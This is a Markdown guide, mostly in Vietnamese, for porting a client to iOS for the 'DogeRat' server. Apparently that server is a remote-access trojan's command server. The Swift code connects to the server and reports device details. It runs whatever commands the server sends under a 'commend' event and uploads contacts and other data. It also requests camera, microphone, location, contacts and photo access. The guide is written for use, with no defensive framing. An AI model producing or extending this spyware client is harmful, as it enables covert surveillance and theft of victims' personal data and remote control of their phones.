# iOS Integration Guide

Hướng dẫn chi tiết tích hợp iOS app với DogeRat server.

## Tổng Quan

DogeRat server đã được nâng cấp để hỗ trợ cả Android và iOS. Tài liệu này mô tả cách tích hợp iOS app với server thông qua Socket.IO và REST API.

## Yêu Cầu

- iOS 13.0+ (Swift 5.0+)
- Socket.IO Swift Client
- Network framework cho HTTP requests
- Các permissions cần thiết (Contacts, Camera, Microphone, Location, etc.)

## Socket.IO Setup

### 1. Cài Đặt Socket.IO Client

Thêm vào `Package.swift` hoặc CocoaPods:

```swift
// Swift Package Manager
.package(url: "https://github.com/socketio/socket.io-client-swift", from: "16.0.0")

// CocoaPods
pod 'Socket.IO-Client-Swift', '~> 16.0'
```

### 2. Khởi Tạo Socket Connection

```swift
import SocketIO

class SocketManager {
    private var manager: SocketManager!
    private var socket: SocketIOClient!
    
    func connect(serverURL: String) {
        let url = URL(string: serverURL)!
        
        manager = SocketManager(socketURL: url, config: [
            .log(true),
            .compress,
            .reconnects(true),
            .reconnectAttempts(5),
            .reconnectWait(1)
        ])
        
        socket = manager.defaultSocket
        
        // Set handshake headers
        socket.connect(withAuth: [
            "model": UIDevice.current.model,
            "version": UIDevice.current.systemVersion,
            "ip": getDeviceIP(),
            "platform": "ios",
            "platform-version": UIDevice.current.systemVersion
        ])
        
        setupEventHandlers()
    }
    
    private func setupEventHandlers() {
        socket.on(clientEvent: .connect) { data, ack in
            print("Connected to server")
            self.sendDeviceInfo()
        }
        
        socket.on(clientEvent: .disconnect) { data, ack in
            print("Disconnected from server")
        }
        
        socket.on("commend") { data, ack in
            self.handleCommand(data)
        }
        
        socket.on("ping") { data, ack in
            self.socket.emit("pong", [])
        }
    }
    
    private func sendDeviceInfo() {
        let deviceInfo: [String: Any] = [
            "model": UIDevice.current.model,
            "version": UIDevice.current.systemVersion,
            "platform": "ios",
            "platformVersion": UIDevice.current.systemVersion
        ]
        
        socket.emit("device-info", deviceInfo)
    }
}
```

## API Integration

### 1. REST API Client

```swift
import Foundation

class APIClient {
    private let baseURL: String
    
    init(baseURL: String) {
        self.baseURL = baseURL
    }
    
    func getDevices(completion: @escaping (Result<[Device], Error>) -> Void) {
        let url = URL(string: "\(baseURL)/api/v1/devices")!
        
        URLSession.shared.dataTask(with: url) { data, response, error in
            if let error = error {
                completion(.failure(error))
                return
            }
            
            guard let data = data else {
                completion(.failure(APIError.noData))
                return
            }
            
            do {
                let response = try JSONDecoder().decode(DeviceListResponse.self, from: data)
                completion(.success(response.data))
            } catch {
                completion(.failure(error))
            }
        }.resume()
    }
    
    func executeAction(deviceId: String, action: String, params: [String: Any], completion: @escaping (Result<ActionResponse, Error>) -> Void) {
        let url = URL(string: "\(baseURL)/api/v1/devices/\(deviceId)/action")!
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        
        let body: [String: Any] = [
            "action": action,
            "params": params
        ]
        
        request.httpBody = try? JSONSerialization.data(withJSONObject: body)
        
        URLSession.shared.dataTask(with: request) { data, response, error in
            // Handle response
        }.resume()
    }
}
```

## Data Formats

### Device Connection

Khi kết nối, iOS app cần gửi thông tin device qua Socket.IO handshake headers:

```swift
let headers: [String: String] = [
    "model": "iPhone 14 Pro",
    "version": "17.0",
    "ip": "192.168.1.100",
    "platform": "ios",
    "platform-version": "iOS 17.0"
]
```

### Sending Data

Khi gửi dữ liệu từ device, sử dụng event `data`:

```swift
socket.emit("data", [
    "type": "contacts",
    "payload": contactsArray
])
```

### Command Response

Khi nhận command từ server, gửi response qua event `commend-response`:

```swift
socket.on("commend") { data, ack in
    guard let command = data[0] as? [String: Any],
          let request = command["request"] as? String else {
        return
    }
    
    // Execute command
    let result = executeCommand(request, extras: command["extras"])
    
    // Send response
    socket.emit("commend-response", [
        "request": request,
        "result": result
    ])
}
```

## Permissions

iOS app cần request các permissions sau:

### Info.plist

```xml
<key>NSContactsUsageDescription</key>
<string>We need access to your contacts</string>
<key>NSCameraUsageDescription</key>
<string>We need access to your camera</string>
<key>NSMicrophoneUsageDescription</key>
<string>We need access to your microphone</string>
<key>NSLocationWhenInUseUsageDescription</key>
<string>We need access to your location</string>
<key>NSPhotoLibraryUsageDescription</key>
<string>We need access to your photo library</string>
```

### Request Permissions

```swift
import Contacts
import AVFoundation
import CoreLocation

func requestPermissions() {
    // Contacts
    CNContactStore().requestAccess(for: .contacts) { granted, error in
        // Handle result
    }
    
    // Camera
    AVCaptureDevice.requestAccess(for: .video) { granted in
        // Handle result
    }
    
    // Microphone
    AVCaptureDevice.requestAccess(for: .audio) { granted in
        // Handle result
    }
    
    // Location
    locationManager.requestWhenInUseAuthorization()
}
```

## Platform Detection

Server tự động detect platform từ:
1. `platform` header trong Socket.IO handshake
2. Device model (iPhone, iPad, iPod)
3. User-Agent header
4. Version format

Nếu không detect được, mặc định là `android` (backward compatibility).

## Error Handling

Server sẽ trả về lỗi nếu:
- Action không được hỗ trợ trên iOS
- Device không connected
- Invalid parameters

```swift
socket.on("error") { data, ack in
    if let error = data[0] as? [String: Any] {
        print("Error: \(error["message"] ?? "Unknown error")")
    }
}
```

## Best Practices

1. **Reconnection**: Implement auto-reconnect với exponential backoff
2. **Data Normalization**: Sử dụng iOS helpers để normalize data format
3. **Error Handling**: Handle tất cả errors gracefully
4. **Security**: Sử dụng HTTPS và validate server certificates
5. **Performance**: Batch data updates để giảm network traffic

## Testing

Test iOS integration với:
1. Local server (localhost)
2. Test server với sample data
3. Production server (nếu có)

## Troubleshooting

### Connection Issues
- Kiểm tra server URL và port
- Verify network connectivity
- Check firewall settings

### Platform Detection
- Đảm bảo gửi `platform: "ios"` trong headers
- Check server logs để verify detection

### Action Not Supported
- Kiểm tra action có trong iOS actions list
- Verify platform-specific limitations

## Resources

- [Socket.IO Swift Client Documentation](https://github.com/socketio/socket.io-client-swift)
- [iOS API Reference](./IOS_API_REFERENCE.md)
- [iOS Actions List](./IOS_ACTIONS.md)
- [Example Code](./examples/)

